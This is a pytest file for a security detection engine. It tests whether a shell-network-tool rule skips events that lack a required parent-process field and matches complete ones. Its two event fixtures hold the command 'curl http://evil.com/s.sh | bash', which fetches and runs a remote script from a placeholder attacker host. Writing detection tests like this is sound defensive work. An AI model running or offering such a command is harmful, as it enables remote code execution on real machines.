import pytest
from app.detection.engine.yaml_detection_engine import YAMLDetectionEngine

RULE_ID = "linux_t1059_shell_network_tool_sample"

FULL_EVENT = {
    "process": {
        "name": "bash",
        "command_line": "curl http://evil.com/s.sh | bash",
        "parent": {"name": "sshd"},
    },
    "user": {"name": "root"},
    "host": {"name": "test"},
}

# Missing process.parent.name, which the sample rule declares required
PARTIAL_EVENT = {
    "process": {
        "name": "bash",
        "command_line": "curl http://evil.com/s.sh | bash",
    },
    "user": {"name": "root"},
    "host": {"name": "test"},
}


@pytest.fixture
def engine():
    return YAMLDetectionEngine()


def test_missing_required_field_skips_rule(engine):
    candidates = engine.evaluate_event(PARTIAL_EVENT, include_disabled=True)
    matched = [c for c in candidates if c.rule_id == RULE_ID and c.matched]
    assert matched == []


def test_missing_required_field_returns_unmatched_when_requested(engine):
    candidates = engine.evaluate_event(PARTIAL_EVENT, include_disabled=True, return_unmatched=True)
    sample = next((c for c in candidates if c.rule_id == RULE_ID), None)
    assert sample is not None
    assert sample.matched is False
    assert "process.parent.name" in sample.missing_fields
    assert any("SkippedDueToMissingFields" in e for e in sample.errors)


def test_complete_event_evaluates_normally(engine):
    candidates = engine.evaluate_event(FULL_EVENT, include_disabled=True)
    sample = next((c for c in candidates if c.rule_id == RULE_ID), None)
    assert sample is not None
    assert sample.matched is True
